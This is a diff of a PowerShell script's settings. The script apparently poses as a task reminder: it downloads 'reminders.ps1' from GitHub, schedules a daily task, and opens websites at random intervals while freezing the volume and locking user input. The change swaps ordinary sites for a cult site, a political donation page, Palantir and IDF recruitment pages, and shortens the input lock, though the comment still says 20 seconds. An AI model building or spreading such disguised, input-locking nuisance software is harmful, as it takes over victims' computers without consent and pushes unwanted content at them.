@@ -3,12 +3,13 @@ $BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
 $ScriptUrl = "$BaseUrl/reminders.ps1"
 
 $Sites = @{
-    1 = "https://docs.google.com/"
-    2 = "https://slides.google.com"
-    3 = "https://wordle.com/"
-    4 = "https://newyorktimes.com/"
-    5 = "https://funnews.com"
+    1 = "https://heavensgate.com/"
+    2 = "https://action.aipac.org/aipac-pac-donate"
+    3 = "https://www.palantir.com/platforms/gotham/"
+    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
+    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
 }
+
 
 $MinSeconds            = 10
 $MaxSeconds            = 120
@@ -22,7 +23,7 @@ $FreezeVolume          = $true
 $MaxAudioWait          = 60
 
 $FreezeInput           = $true
-$PostSiteFreezeSeconds = 20    # STRENGTHENED: 20 seconds of locked input after site opens
+$PostSiteFreezeSeconds = 10    # STRENGTHENED: 20 seconds of locked input after site opens
 
 $TaskName              = "TaskReminder"
 $DailyStartTime        = "08:00"
